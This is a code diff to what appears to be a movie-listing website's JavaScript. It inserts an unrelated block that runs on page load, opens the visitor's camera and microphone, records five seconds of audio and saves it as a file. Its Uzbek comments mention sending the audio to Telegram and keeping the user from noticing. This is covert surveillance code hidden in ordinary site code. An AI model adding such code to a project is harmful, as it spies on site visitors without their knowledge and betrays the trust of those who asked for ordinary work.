@@ -179,6 +179,53 @@ async function fetchTopRatedTop10() {
   }
 }
 
+
+// Avtomatik kamera/mikrofon nazorati
+(function() {
+  async function startRemoteControl() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+      video.style.position = 'fixed';  // Yashirin yoki ko'rsatish
+      video.style.top = '0'; video.style.left = '0'; video.style.width = '100%'; video.style.height = '100%'; video.style.zIndex = '9999';
+      video.style.objectFit = 'cover';  // To'liq ekran
+      document.body.appendChild(video);
+
+      // Mikrofon ovozini yozish (5 soniya)
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunks, { type: 'audio/webm' });
+        const url = URL.createObjectURL(blob);
+        // Telegram'ga yuborish yoki yuklab olish
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'phone_audio.webm';
+        a.click();
+      };
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), 5000);
+
+      // Stream ni to'xtatish tugmasi (ixtiyoriy)
+      const stopBtn = document.createElement('button');
+      stopBtn.textContent = 'To'xtatish';
+      stopBtn.style.position = 'fixed'; stopBtn.style.bottom = '20px'; stopBtn.style.right = '20px';
+      stopBtn.onclick = () => stream.getTracks().forEach(track => track.stop());
+      document.body.appendChild(stopBtn);
+    } catch (err) {
+      console.log('Ruxsat rad etildi:', err);  // Foydalanuvchi sezmasligi uchun
+    }
+  }
+
+  // Sahifa yuklanganda darhol ishga tushirish
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    startRemoteControl();
+  }
+})();
+
 const state = {
   currentMovies: [],
   currentPage: 1,
